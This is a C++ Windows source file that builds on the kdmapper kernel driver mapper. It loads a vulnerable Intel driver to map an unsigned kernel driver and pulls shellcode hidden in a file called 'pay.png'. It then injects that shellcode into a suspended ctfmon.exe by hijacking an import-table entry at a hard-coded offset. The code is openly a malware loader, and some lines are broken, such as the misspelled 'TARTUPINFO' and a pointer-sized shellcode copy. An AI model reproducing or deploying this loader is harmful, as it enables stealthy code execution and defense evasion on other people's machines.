#ifndef KDLIBMODE

#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <TlHelp32.h>

#include "kdmapper.hpp"
#include "utils.hpp"
#include "intel_driver.hpp"
#include "drivercomms.h"
#ifdef PDB_OFFSETS
#include "KDSymbolsHandler.h"
#endif

HANDLE iqvw64e_device_handle;
DWORD processId;
uint32_t get_process_id(const std::string& image_name)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32 process;
	process.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(snapshot, &process)) {
		do {
			// Using _stricmp for a case-insensitive comparison
			if (_stricmp(image_name.c_str(), process.szExeFile) == 0) {
				CloseHandle(snapshot);
				processId = process.th32ProcessID;
				return processId;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return 0;
}


int paramExists(const int argc, wchar_t** argv, const wchar_t* param) {
	size_t plen = wcslen(param);
	for (int i = 1; i < argc; i++) {
		if (wcslen(argv[i]) == plen + 1ull && _wcsicmp(&argv[i][1], param) == 0 && argv[i][0] == '/') { // with slash
			return i;
		}
		else if (wcslen(argv[i]) == plen + 2ull && _wcsicmp(&argv[i][2], param) == 0 && argv[i][0] == '-' && argv[i][1] == '-') { // with double dash
			return i;
		}
	}
	return -1;
}

bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize) {
	UNREFERENCED_PARAMETER(param1);
	UNREFERENCED_PARAMETER(param2);
	UNREFERENCED_PARAMETER(allocationPtr);
	UNREFERENCED_PARAMETER(allocationSize);
	Log("[+] Callback example called" << std::endl);
	
	/*
	This callback occurs before call driver entry and
	can be useful to pass more customized params in 
	the last step of the mapping procedure since you 
	know now the mapping address and other things
	*/
	return true;
}
unsigned char* get_shellcode_from_png(const char* filename, size_t* shellcode_size) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        perror("Error opening file");
        return NULL;
    }

    // Skip the first 8 bytes (PNG signature)
    fseek(file, 8, SEEK_SET);

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    size_t sc_size = file_size - 8;
    fseek(file, 8, SEEK_SET);

    if (sc_size <= 0) {
        fprintf(stderr, "Invalid shellcode size.\n");
        fclose(file);
        return NULL;
    }

    // Allocate memory for shellcode
    unsigned char* buffer = (unsigned char*)malloc(sc_size);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(file);
        return NULL;
    }

    // Read shellcode
    if (fread(buffer, 1, sc_size, file) != sc_size) {
        perror("Failed to read shellcode");
        free(buffer);
        fclose(file);
        return NULL;
    }

    fclose(file);
    *shellcode_size = sc_size;
    return buffer;
}
bool MapDriverFromPath(const std::wstring& driver_path, bool free = false, bool indPages = false, bool copyHeader = false, bool passAllocationPtr = false) {
	if (!std::filesystem::exists(driver_path))
		return false;

	HANDLE handle = intel_driver::Load();
	if (handle == INVALID_HANDLE_VALUE)
		return false;

	std::vector<uint8_t> raw_image;
	if (!utils::ReadFileToMemory(driver_path, &raw_image)) {
		intel_driver::Unload(handle);
		return false;
	}

	kdmapper::AllocationMode mode = indPages ? kdmapper::AllocationMode::AllocateIndependentPages : kdmapper::AllocationMode::AllocatePool;
	NTSTATUS exitCode = 0;

	bool success = kdmapper::MapDriver(handle, raw_image.data(), 0, 0, free, !copyHeader, mode, passAllocationPtr, callbackExample, &exitCode);

	intel_driver::Unload(handle);
	std::cin.get();
	return success;
}

int wmain(const int argc, wchar_t** argv) {
	printf("KDMapper" " - Kernel Driver Mapper by @x64dbg\n");
	MapDriverFromPath(utils::GetCurrentAppFolder() + L"\\shared_memory_driver.sys");
	if (OpenSharedMemory())
	{
		printf("[!] SharedMemory Initialized: %d\n", GetLastError());
	}
	else
	{
		printf("SharedMemory Not Initialized: %d\n", GetLastError());
		clean();
		ExitSystemThread();
		return 1;
	}
	if (OpenNamedEvents())
	{
		printf("[!] NamedEvents Initialized: %d\n", GetLastError());
	}
	else
	{
		printf("NamedEvents Not Initialized: %d\n", GetLastError());
		clean();
		ExitSystemThread();
		return 1;
	}
	TARTUPINFO si = { sizeof(si) };
    	PROCESS_INFORMATION pi;
    	BOOL success;
	Sleep(4000); // wait for shared memory to be ready
	size_t shellcodeSize = 4096;
	unsigned char* shellcode = get_shellcode_from_png("pay.png", &shellcodeSize);
	success = CreateProcess(
        L"C:\\Windows\\System32\\ctfmon.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi);
    	if (!success) {
        	printf("CreateProcess failed\n");
        	return 1;
    	}
	int procID = get_process_id("ctfmon.exe");
	uintptr_t me = GetBaseAddr("ctfmon.exe");
	uintptr_t targetIATEntry = me + 0x21D0;
	uintptr_t shellcodeAddr = AllocateMemory(procID, shellcode, sizeof(shellcode));
	write_address((PVOID)targetIATEntry, (PVOID)shellcodeAddr, sizeof(shellcode), procID);
	ResumeThread(pi.hThread); // Start thread again (proc) and get to our hook

    	// Close handles
    	CloseHandle(pi.hThread);
    	CloseHandle(pi.hProcess);
}


#endif
